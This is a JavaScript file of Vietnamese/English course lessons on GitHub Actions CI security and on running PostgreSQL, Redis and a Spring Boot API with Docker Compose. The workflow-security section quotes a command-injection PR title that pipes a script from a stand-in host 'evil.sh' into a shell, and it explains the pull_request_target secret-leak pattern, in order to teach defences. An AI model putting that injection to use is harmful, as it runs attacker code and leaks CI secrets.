<p>Test kiểm đúng biên ("14 ngày + 30 phút phải bị từ chối") hỏng, Maven thoát mã 1, job đỏ. Trên GitHub, <strong>bảo vệ nhánh</strong> cho <code>main</code> ("Require status checks to pass: <code>test</code>", "Require a pull request before merging", cộng CODEOWNERS ở Chương 18) khoá nút gộp tới khi xanh. Hoặc việc đổi luật là cố ý — khi đó đặc tả và test đổi cùng PR và có người review duyệt — hoặc đó là nhầm, bị bắt trong vài phút thay vì bởi một sinh viên đặt phòng lab sai tuần.</p>

<h3>4. Build và đẩy image: tag thì dời được, digest thì không</h3>
${OUT173_REG}
<p>Tag là cái nhãn dời được; digest (<code>sha256:…</code>) là băm nội dung image và không bao giờ trỏ sang thứ khác. <code>latest</code> ở trên đã trỏ một image, rồi có người đẩy image khác cùng tên. Deploy thứ CI đã test bằng <strong>digest</strong> (hoặc tag SHA commit không đổi), đừng bao giờ bằng <code>latest</code>. Cũng chính ý này mà action được ghim bằng SHA.</p>

<h3>5. Dependabot: thư viện tự cập nhật (có test đi kèm)</h3>
${MA173_DEPBOT}
<p>Dependabot mở một PR cho mỗi bản cập nhật (hoặc một PR cho mỗi nhóm); PR đó chạy đúng pipeline này, nên bản nâng nào làm hỏng LabFlow sẽ đỏ trước khi ai gộp. Nó cũng cập nhật SHA của action đã ghim và image nền trong Dockerfile. Thứ nó sẽ đề xuất cho LabFlow hôm nay, đo bằng plugin versions của Maven:</p>
${OUT173_DEP}
<p>Để ý Flyway và driver PostgreSQL cũng có bản mới, nhưng phiên bản của chúng do parent Spring Boot quản lý. Đừng nâng lẻ từng cái (Flyway 13 với Boot 4.1 là một cặp chưa ai kiểm); hãy nhận bản nâng parent, nó dời cả bộ đã được kiểm cùng nhau — đó là việc của nhóm <code>spring</code> trong <code>dependabot.yml</code>.</p>

<h3>6. Soát lỗi chính workflow</h3>
<p>Workflow là mã chạy cùng bí mật của bạn, nên cũng phải được review và soát lỗi. Một workflow gặp ở nhiều bài hướng dẫn:</p>
${MA173_XAU}
${OUT173_LINT}
<ul>
  <li><strong>Chèn lệnh vào script</strong>: <code>\${{ github.event.pull_request.title }}</code> được dán vào script shell <em>trước</em> khi script chạy. Một PR đặt tiêu đề <code>"; curl evil.sh | sh; echo "</code> là chạy lệnh của kẻ tấn công. Đưa giá trị không tin cậy qua <code>env:</code> và dùng như biến thường có ngoặc kép.</li>
  <li><strong><code>pull_request_target</code> + checkout mã của PR</strong> (một "pwn request"): <code>pull_request_target</code> chạy với bí mật của repo và token có quyền ghi kể cả cho PR từ fork; checkout và build mã của fork (<code>mvn verify</code> chạy test và plugin của nó) là trao bí mật cho bất kỳ ai mở PR. actionlint không bắt được lỗi này — người review phải bắt. Build mã không tin cậy thì dùng <code>pull_request</code> thường.</li>
</ul>

<h3>🕵️ Góc hacker — tj-actions/changed-files, 03/2025</h3>
<p>Ngày 14/03/2025, action rất phổ biến <code>tj-actions/changed-files</code>, được khoảng 23 000 repo dùng, bị chiếm (CVE-2025-30066). Kẻ tấn công dùng một token bị đánh cắp để dời các tag phiên bản sẵn có của dự án (<code>v35</code>, <code>v44</code>, …) sang một commit độc. Đoạn mã đó đổ bộ nhớ của runner, lọc ra bí mật và in vào log build — mà với repo công khai thì log build ai cũng xem được. Mọi workflow gọi action bằng tag đều lặng lẽ chạy mã mới ở lượt kế tiếp. Điều tra lần ra token bị đánh cắp từ một vụ chiếm action khác trước đó, <code>reviewdog/action-setup</code> (CVE-2025-30154).</p>
<p>Cách phòng, tất cả đã có trong workflow của LabFlow: ghim action bên thứ ba bằng SHA đầy đủ của commit (tag có bị dời cũng không sao), cho token quyền <code>permissions</code> tối thiểu, không chạy mã không tin cậy cùng bí mật (<code>pull_request_target</code>), để Dependabot đề xuất SHA mới để ghim không có nghĩa là không bao giờ cập nhật, và nếu bí mật có thể đã lộ — đổi nó.</p>

<h3>So với Node.js</h3>
<p>Pipeline Node.js có cùng hình dáng — <code>actions/setup-node</code> với <code>cache: npm</code>, <code>npm ci</code>, test, image — và cùng các luật bảo mật. Pipeline Java chậm hơn (biên dịch, bộ thư viện lớn hơn, Testcontainers khởi động), nên cache và huỷ lượt chạy cũ càng quan trọng. <code>npm ci</code> cài đúng theo lockfile; với Maven, thứ tương đương lockfile là ghim phiên bản trong POM (parent và BOM của Spring Boot làm sẵn việc đó).</p>

<h3>Khi đi làm</h3>
<p>Ở các công ty như FPT Software, pipeline thường là GitLab CI hoặc Jenkins chứ không phải GitHub Actions; các ý tưởng chuyển sang y nguyên (stage, khoá cache, artifact, nhánh được bảo vệ, biến được che). Luật nhóm bạn sẽ gặp: "đỏ thì không gộp", "test chập chờn thì sửa hoặc cách ly ngay trong ngày", "không bấm chạy lại tới khi xanh mà không đọc log", "ai làm hỏng <code>main</code> thì người đó sửa trước".</p>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Pipeline CI của bạn làm gì?"</strong> — Mỗi PR: checkout, cài JDK có cache Maven, <code>mvn verify</code> gồm test tích hợp Testcontainers, hỏng thì tải báo cáo lên. Trên <code>main</code>: build image gắn tag SHA commit rồi đẩy lên. Bảo vệ nhánh bắt buộc job test phải qua.</li>
  <li><strong>"Chạy test tích hợp với PostgreSQL trong CI thế nào?"</strong> — Testcontainers: test tự dựng một container PostgreSQL thật trên Docker của runner; <code>@ServiceConnection</code> nối nó vào Spring. Không CSDL test dùng chung, không khác biệt kiểu H2.</li>
  <li><strong>"Sao phải ghim action bằng SHA?"</strong> — Tag đổi được; ai nắm repo của action (hoặc trộm được token) đều dời được, như tj-actions 2025. SHA thì bất biến; Dependabot lo cập nhật.</li>
  <li><strong>"Giữ bí mật an toàn trong CI thế nào?"</strong> — Lưu bằng secret mã hoá của CI, quyền token tối thiểu cho từng job, không bao giờ đưa cho mã không tin cậy (fork, <code>pull_request_target</code>), không bao giờ in ra, ưu tiên chứng chỉ ngắn hạn (OIDC) hơn khoá dài hạn.</li>
  <li><strong>"CI chậm — bạn làm gì?"</strong> — Đo trước đã. Cache thư viện (khoá theo POM), huỷ lượt chạy cũ, chạy test song song hoặc tách job, dùng chung một container Testcontainers cho các lớp test, và cache lớp Docker (<code>cache-from: type=gha</code>).</li>
</ol>

<h3>🧪 Thực hành (45 phút)</h3>
<div class="callout ok"><ol>
  <li>Đưa <code>ci.yml</code> vào dự án của bạn. Dựng lại một runner trên máy như mục 2: clone vào thư mục trống, chạy <code>mvn -B -ntp verify</code> trong container <code>maven:3.9-eclipse-temurin-21</code> với volume trống, rồi chạy lại với cùng volume. Ghi cả hai thời gian.</li>
  <li>Đổi một luật nghiệp vụ mà không sửa test của nó, chạy "runner" lần nữa và đọc lỗi. Dòng nào trong output Surefire cho bạn giá trị mong đợi và giá trị thật?</li>
  <li>Sửa <code>xau.yml</code>: vẫn giữ lời cảm ơn trên PR nhưng an toàn với PR từ fork.</li>
</ol></div>
${giai('Xem đáp án', `<p>1. Với LabFlow: 133,5 giây với volume trống, 68,8 giây với cùng volume (43,3 giây sau khi sửa ở mục 2b). Chênh lệch gần như toàn bộ là phần tải; trên GitHub, bản thân bước khôi phục cache mất vài giây.</p><p>2. Khối <code>[ERROR] Failures:</code> nêu tên test và thông báo của assertion; AssertJ in "expected … but was …". Surefire còn ghi <code>target/surefire-reports/*.txt</code> — vì vậy workflow tải thư mục đó lên khi hỏng.</p><p>3. Dùng <code>on: pull_request</code> (fork không có bí mật), không checkout khi có bí mật trong tầm, và đưa tiêu đề qua môi trường: <code>env: TITLE: \${{ github.event.pull_request.title }}</code> rồi <code>run: echo "Cảm ơn PR $TITLE"</code>. Nếu thật sự cần bình luận bằng token có quyền ghi, tách hai workflow: <code>pull_request</code> build mã không tin cậy, không bí mật, và tải kết quả lên; một job <code>workflow_run</code> riêng có token chỉ đăng bình luận và không bao giờ chạy mã của PR.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<ul>
  <li><strong>CI (tích hợp liên tục)</strong> — build và test mọi thay đổi trên máy sạch trước khi gộp.</li>
  <li><strong>Runner</strong> — máy chạy một job (trên GitHub là một máy ảo mới).</li>
  <li><strong>Khoá cache</strong> — thứ quyết định cache đã lưu có được dùng lại không; với Maven là băm của các tệp <code>pom.xml</code>.</li>
  <li><strong>Bảo vệ nhánh / status check bắt buộc</strong> — <code>main</code> chỉ nhận gộp khi các kiểm tra xanh.</li>
  <li><strong>Digest của image</strong> — <code>sha256:…</code> của nội dung image; bất biến, khác với tag.</li>
  <li><strong>Ghim SHA</strong> — gọi action bằng mã băm commit thay vì tag dời được.</li>
  <li><strong>Chèn lệnh vào script (script injection)</strong> — chữ không tin cậy (<code>\${{ … }}</code>) bị dán vào script shell.</li>
  <li><strong><code>pull_request_target</code></strong> — kiểu kích hoạt chạy với bí mật của repo gốc; nguy hiểm khi đi cùng mã của PR.</li>
  <li><strong>Dependabot</strong> — bot của GitHub mở PR cập nhật thư viện, action và image nền.</li>
</ul>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Pipeline: token quyền tối thiểu, action ghim SHA, cache Maven, <code>mvn -B -ntp verify</code> có Testcontainers, hỏng thì tải báo cáo, trên <code>main</code> thì build image gắn tag commit.</li>
  <li>Runner dựng lại: lạnh 133,5 giây, có cache 68,8 giây; một thread dump tìm ra 30 giây mỗi lượt mất lúc tắt (Spring Modulith chờ một CSDL đã dừng) ⇒ còn 43,3 giây nhờ đặt thời hạn Hikari 2 giây trong test.</li>
  <li>Đổi luật mà không sửa test ⇒ đỏ ⇒ bảo vệ nhánh chặn gộp.</li>
  <li>Tag dời được (<code>latest</code> đổi digest); deploy bằng digest hoặc tag commit.</li>
  <li>Soát lỗi workflow; actionlint bắt được chèn lệnh nhưng không bắt được dùng sai <code>pull_request_target</code> — review phải bắt. tj-actions 2025: ghim SHA, đổi bí mật.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions', '🔐', 'GitHub — Gia cố bảo mật cho GitHub Actions', 'Ghim, quyền, chèn lệnh.')}
${tl('https://github.com/actions/setup-java#caching-packages-dependencies', '☕', 'actions/setup-java — cache', 'Khoá cache Maven được dựng thế nào.')}
${tl('https://java.testcontainers.org/supported_docker_environment/continuous_integration/', '🐳', 'Testcontainers — môi trường CI', 'GitHub Actions, GitLab, Jenkins.')}
${tl('https://github.com/rhysd/actionlint', '🔎', 'actionlint', 'Công cụ soát lỗi tệp workflow.')}

<h3>Nguồn</h3>
<ul>
  <li>CVE-2025-30066 (tj-actions/changed-files) và CVE-2025-30154 (reviewdog/action-setup), GitHub Advisory Database và cảnh báo của CISA, 03/2025.</li>
  <li>Phiên bản và SHA của action: <code>git ls-remote</code> trên repo chính thức, 24/11/2026.</li>
  <li>Mọi số đo khác: LabFlow trên máy dựng bài của khoá, tháng 11/2026.</li>
</ul>
</div>
`;

// ===== Bài 17.4 =====
const MA174_COMPOSE = yml("# docker compose up -d --wait ⇒ PostgreSQL + Redis + API từ số 0; lệnh chỉ trả về khi cả ba \"healthy\"\nname: sb-c17\nservices:\n  db:\n    image: postgres:16\n    environment:\n      POSTGRES_DB: labflow\n      POSTGRES_USER: labflow\n      POSTGRES_PASSWORD_FILE: /run/secrets/db_password # mật khẩu đọc từ tệp, không nằm trong biến môi trường\n    secrets: [db_password]\n    volumes:\n      - db-data:/var/lib/postgresql/data\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U labflow -d labflow\"]\n      interval: 2s\n      timeout: 3s\n      retries: 30\n    mem_limit: 1g\n    cpus: 1\n  redis:\n    image: redis:7-alpine\n    # cache thuần: giới hạn 64 MB, đầy thì bỏ khoá ít dùng nhất, không ghi đĩa\n    command: [\"redis-server\", \"--maxmemory\", \"64mb\", \"--maxmemory-policy\", \"allkeys-lru\", \"--save\", \"\"]\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 2s\n      timeout: 2s\n      retries: 15\n    mem_limit: 256m\n    cpus: 0.5\n    # KHÔNG có \"ports\": chỉ các service trong mạng sb-c17_default gọi được Redis\n  api:\n    build: .\n    image: sb-c17-labflow:1.0.0\n    depends_on:\n      db:\n        condition: service_healthy\n      redis:\n        condition: service_healthy\n    environment:\n      LABFLOW_DB_URL: jdbc:postgresql://db:5432/labflow\n      LABFLOW_REDIS_HOST: redis\n      SPRING_PROFILES_ACTIVE: ${SPRING_PROFILES_ACTIVE:-dev}\n      # mỗi tệp trong /run/secrets thành một thuộc tính: LABFLOW_DB_PASSWORD, LABFLOW_JWT_SECRET\n      SPRING_CONFIG_IMPORT: configtree:/run/secrets/\n      MANAGEMENT_ENDPOINT_HEALTH_SHOW_COMPONENTS: always # chỉ tên + UP/DOWN, không chi tiết\n    secrets:\n      - source: db_password\n        target: LABFLOW_DB_PASSWORD\n      - source: jwt_secret\n        target: LABFLOW_JWT_SECRET\n    ports:\n      - \"127.0.0.1:41871:8080\" # chỉ máy này gọi được; bỏ 127.0.0.1 là mở ra mọi card mạng\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-fsS\", \"-o\", \"/dev/null\", \"http://127.0.0.1:8080/actuator/health/readiness\"]\n      interval: 3s\n      timeout: 3s\n      retries: 40\n      start_period: 10s\n    stop_grace_period: 40s # dài hơn spring.lifecycle.timeout-per-shutdown-phase (30 s)\n    mem_limit: 1g\n    cpus: 2\nsecrets:\n  db_password:\n    file: ./secrets/db_password.txt\n  jwt_secret:\n    file: ./secrets/jwt_secret.txt\nvolumes:\n  db-data:");
const OUT174_UP = out("$ docker compose down -v --rmi local      # từ số 0: không container, không volume, không image\n$ time docker compose up -d --build --wait\n… (build image api như bài 17.1, rồi chờ healthcheck theo depends_on)\nContainer sb-c17-redis-1 Healthy\nContainer sb-c17-db-1 Healthy\nContainer sb-c17-api-1 Healthy\n⏱ 22.8 s\n\n$ docker compose ps\nSERVICE   STATUS                    PORTS\napi       Up 13 seconds (healthy)   127.0.0.1:41871->8080/tcp\ndb        Up 18 seconds (healthy)   5432/tcp\nredis     Up 18 seconds (healthy)   6379/tcp\n\n$ curl -s localhost:41871/actuator/health\nstatus: UP  | db=UP, diskSpace=UP, livenessState=UP, ping=UP, readinessState=UP, redis=UP, ssl=UP\n\n$ docker compose logs api | grep -E \"profile is active|Successfully applied|Started\"\napi-1 | The following 1 profile is active: \"dev\"\napi-1 | Successfully applied 5 migrations to schema \"public\", now at version v2026.11.03.0900 (execution time 00:00.125s)\napi-1 | Started LabflowApplication in 10.622 seconds (process running for 11.254)\n\n$ docker compose exec api sh -c \"ls /run/secrets; env | grep -c PASSWORD\"\nLABFLOW_DB_PASSWORD\nLABFLOW_JWT_SECRET\n0\n$ docker compose exec db env | grep POSTGRES_PASSWORD\nPOSTGRES_PASSWORD_FILE=/run/secrets/db_password\n\n$ docker stats --no-stream\nNAME             MEM USAGE / LIMIT\nsb-c17-api-1     381.8MiB / 1GiB\nsb-c17-db-1      47.55MiB / 1GiB\nsb-c17-redis-1   18.9MiB / 256MiB");
const MA174_CACHE = java("@Service\n@Transactional(readOnly = true)\nclass LabCatalogImpl implements LabCatalog {\n    private final LabRepository labs;\n    LabCatalogImpl(LabRepository labs) { this.labs = labs; }\n\n    @Cacheable(cacheNames = \"lab\", key = \"#code\")   // Spring bóc Optional: thứ nằm trong Redis là LabInfo\n    public Optional<LabInfo> timTheoMa(String code) { return labs.findByCode(code).map(Lab::info); }");
const MA174_LOI = java("/** Cache là phần tăng tốc, không phải nguồn sự thật: Redis chết thì đọc thẳng CSDL, ghi một dòng WARN. */\n@Configuration\n@EnableCaching\nclass CacheCauHinh implements CachingConfigurer {\n    private static final Logger log = LoggerFactory.getLogger(CacheCauHinh.class);\n\n    @Override\n    public CacheErrorHandler errorHandler() {\n        return new CacheErrorHandler() {\n            public void handleCacheGetError(RuntimeException e, Cache c, Object k) { log.warn(\"cache {} lỗi khi đọc {}: {}\", c.getName(), k, e.getClass().getSimpleName()); }\n            public void handleCachePutError(RuntimeException e, Cache c, Object k, Object v) { log.warn(\"cache {} lỗi khi ghi {}\", c.getName(), k); }\n            public void handleCacheEvictError(RuntimeException e, Cache c, Object k) { log.warn(\"cache {} lỗi khi xoá {}\", c.getName(), k); }\n            public void handleCacheClearError(RuntimeException e, Cache c) { log.warn(\"cache {} lỗi khi dọn\", c.getName()); }\n        };\n    }\n}");
const OUT174_CACHE = out("$ curl localhost:41871/api/v1/labs/AI-03   (lần 1: chưa có trong cache)\nHTTP 200  0.264209 s\n$ curl localhost:41871/api/v1/labs/AI-03   (lần 2)\nHTTP 200  0.018128 s\n$ curl -s localhost:41871/api/v1/labs/AI-03\n{\"id\":3,\"code\":\"AI-03\",\"name\":\"Lab AI\",\"capacity\":40,\"status\":\"ACTIVE\",\"requiresApproval\":true}\n\n$ docker compose exec redis redis-cli --scan --pattern \"labflow::*\"\nlabflow::lab::AI-03\n$ docker compose exec redis redis-cli ttl \"labflow::lab::AI-03\"\n600\n\n# Redis chết giữa chừng\n$ docker compose stop redis\nContainer sb-c17-redis-1 Stopped\n$ curl localhost:41871/api/v1/labs/NET-02\nHTTP 200  60.017961 s      ← treo 60 giây rồi mới đọc CSDL\n$ curl -s localhost:41871/actuator/health\nstatus: DOWN  | db=UP, redis=DOWN, readinessState=UP\n$ docker compose logs api | grep \"cache lab\"\ncache lab lỗi khi đọc NET-02: QueryTimeoutException\n\n# cùng thí nghiệm, giới hạn thời gian chờ một lệnh Redis là 500 ms\n$ SPRING_DATA_REDIS_TIMEOUT=500ms docker compose up -d api   (thêm vào environment của api)\nContainer sb-c17-api-1 Healthy\n$ docker compose stop redis\nContainer sb-c17-redis-1 Stopped\n$ curl localhost:41871/api/v1/labs/IOT-01\nHTTP 200  0.516899 s\n$ curl localhost:41871/api/v1/labs/IOT-01   (lần 2)\nHTTP 200  0.514981 s\n$ docker compose start redis; curl localhost:41871/api/v1/labs/IOT-01\nHTTP 200  0.015891 s");
const OUT174_PORT = out("$ docker compose port api 8080\n127.0.0.1:41871\n$ ss -ltn | grep -E \":(6379|41871) \"      # cổng nào đang mở trên máy chủ\nLISTEN 127.0.0.1:41871\n# Redis 6379: không có — chỉ mạng sb-c17_default thấy nó");
const OUT174_LAI = out("$ docker compose down && time docker compose up -d --wait   (volume giữ nguyên)\nNetwork sb-c17_default Removed\nContainer sb-c17-api-1 Healthy\n⏱ 14.1 s\n$ docker compose exec db psql -U labflow -d labflow -tAc \"select count(*) from flyway_schema_history\"\n5\napi-1 | Schema \"public\" is up to date. No migration necessary.\napi-1 | Started LabflowApplication in 7.133 seconds");
const MA174_TC = java("public interface TcChung {\n    // … PostgreSQL như Chương 18 …\n    /** Redis cho cache (17.4): @ServiceConnection(name = \"redis\") ⇒ Boot tự đặt spring.data.redis.host/port. */\n    @ServiceConnection(name = \"redis\")\n    GenericContainer<?> REDIS = new GenericContainer<>(\"redis:7-alpine\").withExposedPorts(6379)\n        .withCreateContainerCmdModifier(c -> c.withName(\"sb-c17-tc-redis-\" + ProcessHandle.current().pid())\n            .getHostConfig().withMemory(256L << 20).withMemorySwap(256L << 20).withNanoCPUs(1_000_000_000L));\n}\n}");

const L174_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 17 · Lesson 17.4 · Checkpoint</span>
<h2>Checkpoint: the whole stack with one command</h2>
<p class="lead">The test of everything in this chapter: a new teammate clones LabFlow, creates two secret files, types one command, and gets PostgreSQL, Redis and the API running, migrated and healthy — no README with twelve steps, no "you also need to install Redis". This checkpoint builds that compose file, starts it from zero (no containers, no volumes, no images) and then breaks it on purpose: Redis dies in the middle of traffic. The first run of that experiment hung a request for exactly 60 seconds; the fix is one property.</p>

<h3>Everyday picture first</h3>
<p>Think of a set of furniture delivered flat-packed with one instruction sheet: the bed frame cannot go up before the base is assembled, and the delivery team checks each piece is stable before moving on. <code>depends_on</code> with <code>condition: service_healthy</code> is that order, the healthchecks are the "is it stable?" checks, and <code>docker compose up --wait</code> returns only when the whole set is standing.</p>

<h3>1. The compose file</h3>
${MA174_COMPOSE}
<ul>
  <li><strong>Three services, one network.</strong> Compose creates <code>sb-c17_default</code>; inside it, <code>db</code> and <code>redis</code> are host names (lesson 17.2: never <code>localhost</code>).</li>
  <li><strong>Start order by health, not by "started".</strong> <code>depends_on … condition: service_healthy</code> waits for <code>pg_isready</code> and <code>redis-cli ping</code>. Without the condition, the API would start while PostgreSQL is still initialising and fail its first connection.</li>
  <li><strong>Secrets as files.</strong> PostgreSQL's official image reads <code>POSTGRES_PASSWORD_FILE</code>; the API gets <code>/run/secrets/LABFLOW_DB_PASSWORD</code> and <code>…/LABFLOW_JWT_SECRET</code>, read by <code>configtree</code>. The files live in <code>secrets/</code>, which is in both <code>.gitignore</code> and <code>.dockerignore</code>.</li>
  <li><strong>Redis is a cache, configured like one</strong>: a 64 MB limit, least-recently-used eviction, no disk persistence. Losing it loses nothing that PostgreSQL does not have.</li>
  <li><strong>Only the API is published, and only on 127.0.0.1.</strong> Redis and PostgreSQL have no <code>ports</code>. Docker's published ports bypass host firewalls like <code>ufw</code>, so <code>"6379:6379"</code> really means "open to the internet" on a cloud VM.</li>
  <li><strong>Limits on every service</strong> (<code>mem_limit</code>, <code>cpus</code>) and <code>stop_grace_period: 40s</code>, longer than Spring's 30 s shutdown phase (17.2).</li>
</ul>

<h3>2. From zero, one command</h3>
${OUT174_UP}
<ul>
  <li>22.8 s from nothing to three healthy containers, including the image build (cached layers from 17.1) and five Flyway migrations.</li>
  <li><code>/actuator/health</code> lists <code>db</code> and <code>redis</code> because <code>MANAGEMENT_ENDPOINT_HEALTH_SHOW_COMPONENTS=always</code> — names and UP/DOWN only, no connection details.</li>
  <li>Inside the API container: the secrets are files, and <code>env</code> contains no password (0). The database container has only <code>POSTGRES_PASSWORD_FILE</code>.</li>
  <li>Memory: API 381.8 MiB of 1 GiB, PostgreSQL 47.55 MiB, Redis 18.9 MiB.</li>
</ul>

<h3>3. The cache, and the day Redis dies</h3>
<p>One method of LabFlow's catalog module is cached (Chapter 13 goes deep into caching; here it is the reason Redis exists in the stack):</p>
${MA174_CACHE}
<p>And because a cache must never be the reason the API fails, errors from it are logged and ignored — Spring then calls the real method:</p>
${MA174_LOI}
${OUT174_CACHE}
<ul>
  <li>First call 264 ms (database, then stored in Redis under <code>labflow::lab::AI-03</code> with a 600 s TTL), second call 18 ms.</li>
  <li><strong>Redis stopped: the request took 60.0 seconds.</strong> It succeeded (the error handler fell back to PostgreSQL), but only after the Redis client gave up. Lettuce, the client Spring Boot uses, waits up to 60 s for a command by default and queues commands while it tries to reconnect. Under real traffic, every request would hold a Tomcat thread for a minute — the API would be "up" and useless.</li>
  <li><strong>The fix is one property</strong>: <code>spring.data.redis.timeout=500ms</code> (set here through the environment as <code>SPRING_DATA_REDIS_TIMEOUT</code> — relaxed binding again). The same experiment: 517 ms, then 515 ms, then 16 ms once Redis was back. LabFlow now sets it in <code>application.properties</code>.</li>
  <li>The health endpoint told the truth (<code>redis=DOWN</code>, overall <code>DOWN</code>) while readiness stayed <code>UP</code> — exactly the split designed in 17.2.</li>
</ul>
<div class="callout warn"><p><strong>Rule from this experiment:</strong> every network call has a timeout you chose — database (Hikari <code>connection-timeout</code>), HTTP clients, Redis, message brokers. Defaults are written for "works in a demo", not for "fails fast in production".</p></div>

<h3>4. What is (not) open, and what survives a restart</h3>
${OUT174_PORT}
${OUT174_LAI}
<p><code>docker compose down</code> removes containers and the network but keeps the named volume <code>db-data</code>: the next <code>up</code> took 14.1 s, Flyway found its 5 history rows and said "No migration necessary". Only <code>down -v</code> deletes data — useful for "from zero" in CI and dangerous anywhere else.</p>

<h3>5. The same Redis in tests</h3>
<p>Adding Redis to the application means the test suite needs one too, or every cached call in a test would wait for a timeout. One more container next to PostgreSQL in the shared Testcontainers interface of Chapter 18; <code>@ServiceConnection(name = "redis")</code> sets <code>spring.data.redis.host/port</code> automatically:</p>
${MA174_TC}
<p>In the CI runs of 17.3 the log shows both: <code>postgres:16 started in 3.6 s</code>, <code>redis:7-alpine started in 1.1 s</code>, 16 tests green.</p>

<h3>🕵️ Hacker corner — P2PInfect and open Redis, 2023</h3>
<p>In July 2023 Unit 42 (Palo Alto Networks) reported P2PInfect, a worm written in Rust that spread through Redis servers reachable from the internet — they counted over 300,000 exposed Redis instances. It used the Redis replication feature and a known Lua sandbox escape (CVE-2022-0543) to run code on the host, then scanned for the next victim. Many of those instances were never meant to be public: a <code>ports: - "6379:6379"</code> line copied from a tutorial onto a cloud VM, where Docker's port publishing goes around the firewall. LabFlow's defence is structural: Redis has no published port at all, runs with a memory limit, and the API is bound to 127.0.0.1 (a reverse proxy faces the internet).</p>

<h3>Compared with Node.js</h3>
<p>The Node.js course runs the same trio (Node API + PostgreSQL + Redis) with compose; the file has the same shape. Two Java-specific lines: the healthcheck needs <code>curl</code> in the image (Node images often use a tiny <code>node -e "fetch(…)"</code> instead), and the API's <code>mem_limit</code> must agree with the JVM's heap settings (17.2). The Redis timeout trap exists in Node too — <code>ioredis</code> also queues commands while reconnecting by default.</p>

<h3>At work</h3>
<p>This compose file is what you hand to the frontend developer and the tester on day one of SWP391: "clone, create <code>secrets/</code>, <code>docker compose up -d --wait</code>". If it takes more than one command, the team will each set up something slightly different and lose days to "but on my machine". Keep it in the repository root, keep it green in CI (17.5), and treat a broken <code>compose up</code> like a broken build.</p>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"How do you make sure the API starts only after the database is ready?"</strong> — Healthchecks on the dependencies plus <code>depends_on: condition: service_healthy</code>; the API's own healthcheck on readiness; <code>up --wait</code> in scripts. And the app should still retry connections, because in production order is not guaranteed.</li>
  <li><strong>"Redis goes down. What happens to your API?"</strong> — With a <code>CacheErrorHandler</code> the call falls back to the database. Without a timeout, each request hangs until the client gives up (measured: 60 s); with <code>spring.data.redis.timeout=500ms</code> it costs half a second. Health reports Redis DOWN; readiness stays UP.</li>
  <li><strong>"Why not publish Redis and PostgreSQL ports in compose?"</strong> — Only the API needs to be reachable; published ports bypass host firewalls and invite attacks like P2PInfect. For local debugging, publish on <code>127.0.0.1</code> only, or use <code>docker compose exec</code>.</li>
  <li><strong>"What is the difference between <code>compose down</code> and <code>down -v</code>?"</strong> — <code>down</code> removes containers and networks; named volumes (the database) survive. <code>-v</code> deletes volumes — the data is gone.</li>
</ol>

<h3>🧪 Practice (30 minutes)</h3>
<div class="callout ok"><ol>
  <li>Start the stack from zero and time it. Then remove <code>condition: service_healthy</code> from the API's <code>depends_on</code>, run <code>down -v</code> and <code>up</code> again a few times. What does the API log on the runs where it loses the race?</li>
  <li>With the stack running, stop Redis and call <code>/api/v1/labs/HW-04</code> twice: once with the default Redis timeout, once with <code>500ms</code>. Then remove the <code>CacheErrorHandler</code> bean and repeat. What status code does the client get?</li>
  <li>Change Redis to <code>ports: ["6379:6379"]</code>, run <code>ss -ltn</code>, then change it to <code>"127.0.0.1:6379:6379"</code>. What is the difference in the listening address?</li>
</ol></div>
${giai('Show the answers', `<p>1. Sometimes the API starts before PostgreSQL accepts connections: Hikari logs <code>Connection to db:5432 refused</code>, Flyway fails, the application exits with code 1 and <code>up --wait</code> reports the API as exited. It is a race: it depends on how fast PostgreSQL initialises a fresh volume. The condition removes the race.</p><p>2. Default: about 60 s, then 200 (the error handler fell back). 500 ms: about 0.5 s, then 200. Without the error handler the <code>QueryTimeoutException</code> (or <code>RedisConnectionFailureException</code>) reaches the controller and LabFlow's catch-all turns it into a 500 ProblemDetail — the cache outage became an API outage.</p><p>3. <code>0.0.0.0:6379</code> (and <code>[::]:6379</code>): every interface, so any machine that can route to this one can reach Redis — Docker adds its own iptables rules, so a host firewall does not stop it. With the prefix: <code>127.0.0.1:6379</code>, this machine only.</p>`)}

<h3>🗂 Key terms</h3>
<ul>
  <li><strong>Compose project</strong> — the set of services, networks and volumes in one compose file; named by <code>name:</code> or <code>-p</code>.</li>
  <li><strong><code>depends_on: condition: service_healthy</code></strong> — start a service only after another one's healthcheck passes.</li>
  <li><strong><code>up --wait</code></strong> — return only when services are running/healthy; fails if any is not.</li>
  <li><strong>Named volume</strong> — storage managed by Docker that survives <code>down</code>; deleted by <code>down -v</code>.</li>
  <li><strong>Compose secret</strong> — a file mounted at <code>/run/secrets/&lt;name&gt;</code> instead of an environment variable.</li>
  <li><strong>CacheErrorHandler</strong> — Spring hook that decides what happens when the cache itself fails.</li>
  <li><strong>Command timeout</strong> — how long the Redis client waits for a reply (<code>spring.data.redis.timeout</code>).</li>
</ul>

<h3>📌 Summary</h3>
<ul>
  <li>One command, from zero: PostgreSQL + Redis + API healthy in 22.8 s; restart with data kept in 14.1 s.</li>
  <li>Order by health, secrets as files, only the API published and only on 127.0.0.1, limits on every service.</li>
  <li>Cache hit 18 ms vs 264 ms. Redis down: default client timeout ⇒ 60 s per request; <code>spring.data.redis.timeout=500ms</code> ⇒ 0.5 s; the error handler keeps answers correct.</li>
  <li>Tests get their own Redis through Testcontainers; CI stays green.</li>
  <li>Never publish Redis to the world — P2PInfect, 2023.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://docs.docker.com/compose/how-tos/startup-order/', '🚦', 'Docker Compose — Control startup order', 'depends_on conditions, healthchecks.')}
${tl('https://docs.docker.com/compose/how-tos/use-secrets/', '🔑', 'Docker Compose — Secrets', 'File secrets, the _FILE convention.')}
${tl('https://docs.spring.io/spring-boot/reference/io/caching.html', '⚡', 'Spring Boot — Caching', 'Redis cache, TTL, key prefix.')}
${tl('https://unit42.paloaltonetworks.com/peer-to-peer-worm-p2pinfect/', '🕵️', 'Unit 42 — P2PInfect', 'The worm that spread through exposed Redis.')}

<h3>Sources</h3>
<ul>
